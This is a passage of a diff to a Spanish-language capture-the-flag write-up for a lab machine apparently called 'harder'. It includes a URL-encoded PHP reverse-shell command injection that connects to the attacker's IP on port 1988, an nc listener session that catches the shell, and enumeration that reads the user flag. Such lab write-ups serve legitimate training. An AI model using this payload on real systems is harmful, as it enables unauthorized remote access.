@@ -292,4 +292,29 @@ Cuando ejecutamos la reverse shell nos da un error, indicandonos que no encuentr
 
 	cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.54.226%22%2C1988%29%3Bpopen%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27;
 
+## Flag user.txt
+
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+	└─# nc -lnvp 1988
+	listening on [any] 1988 ...
+	connect to [10.18.54.226] from (UNKNOWN) [10.10.29.10] 38050
+	whoami
+	www
+ 
+	ls -la /home/www
+	total 8
+	drwxr-sr-x    2 www      www           4096 Jul  7  2020 .
+	drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
+ 
+	ls -la /home/evs
+	total 12
+	drwxr-sr-x    1 evs      evs           4096 Jul  7  2020 .
+	drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
+	-rw-r--r--    1 evs      evs             33 Jul  6  2020 user.txt
+ 
+ 	cat /home/evs/user.txt
+	FLAG[---user.txt---]
+
+
+ 
 
